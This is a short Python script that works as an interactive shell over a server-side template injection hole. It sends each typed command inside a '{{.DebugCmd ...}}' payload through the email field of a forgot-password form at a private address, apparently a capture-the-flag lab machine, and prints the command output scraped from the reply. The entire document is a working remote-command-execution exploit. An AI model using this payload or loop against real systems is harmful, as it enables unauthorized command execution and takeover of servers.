import requests
import re

url = 'http://10.10.11.113:8080/forgot/'

while True:
    try:
        debug = '{{.DebugCmd "'
        command = input("$> ")
        debug_cmd = debug + command + '"}}'
        data = {
            "email":debug_cmd
        }
        req_site = requests.post(url,data=data)
        search = re.compile(r"Email Sent To: (.*?)\s+<button class", re.DOTALL) 
        output_text = search.search(req_site.text).group(1)
        print(output_text)



    except KeyboardInterrupt:
        exit() 